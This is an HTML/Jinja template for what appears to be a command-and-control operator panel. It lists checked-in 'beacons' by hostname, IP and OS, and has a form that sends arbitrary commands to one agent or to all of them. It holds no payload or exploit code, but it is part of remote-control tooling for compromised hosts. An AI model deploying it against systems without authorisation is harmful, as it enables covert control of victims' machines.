<!DOCTYPE html>
<html>
<head>
    <title>C2 COMMANDER</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #0f0f0f; color: #00ff00; font-family: 'Courier New', monospace; }
        .card { background-color: #1a1a1a; border: 1px solid #00ff00; border-radius: 0; }
        .table { color: #00ff00; border-color: #333; }
        .form-control, .form-select { background-color: #000; color: #00ff00; border: 1px solid #00ff00; border-radius: 0; }
        .btn-danger { border-radius: 0; font-weight: bold; background-color: #8b0000; }
        .status-dot { height: 10px; width: 10px; background-color: #00ff00; border-radius: 50%; display: inline-block; margin-right: 5px; }
    </style>
</head>
<body class="p-5">
    <div class="container">
        <h1 class="mb-4">TERMINAL_C2_v1.0</h1>
        
        <div class="card mb-4">
            <div class="card-header bg-success text-black"><b>ACTIVE_BEACONS</b></div>
            <div class="card-body">
                <table class="table">
                    <thead>
                        <tr>
                            <th>HOSTNAME</th>
                            <th>IP_ADDRESS</th>
                            <th>OPERATING_SYSTEM</th>
                            <th>LAST_CHECKIN</th>
                        </tr>
                    </thead>
                    <tbody>
                        {% for host, info in agents.items() %}
                        <tr>
                            <td><span class="status-dot"></span>{{ host }}</td>
                            <td>{{ info.ip }}</td>
                            <td>{{ info.os }}</td>
                            <td>{{ info.last_seen }}</td>
                        </tr>
                        {% endfor %}
                    </tbody>
                </table>
            </div>
        </div>

        <div class="card">
            <div class="card-header bg-danger text-white"><b>ISSUE_COMMAND</b></div>
            <div class="card-body">
                <form action="/admin/send_cmd" method="POST">
                    <div class="row">
                        <div class="col-md-3">
                            <label>TARGET_HOST</label>
                            <select name="target" class="form-select">
                                <option value="ALL">ALL_AGENTS</option>
                                {% for host in agents %}
                                <option value="{{ host }}">{{ host }}</option>
                                {% endfor %}
                            </select>
                        </div>
                        <div class="col-md-7">
                            <label>COMMAND_STRING</label>
                            <input type="text" name="command" class="form-control" placeholder="C:\> enter command here..." required>
                        </div>
                        <div class="col-md-2 d-flex align-items-end">
                            <button type="submit" class="btn btn-danger w-100">TRANSMIT</button>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
</body>
</html>
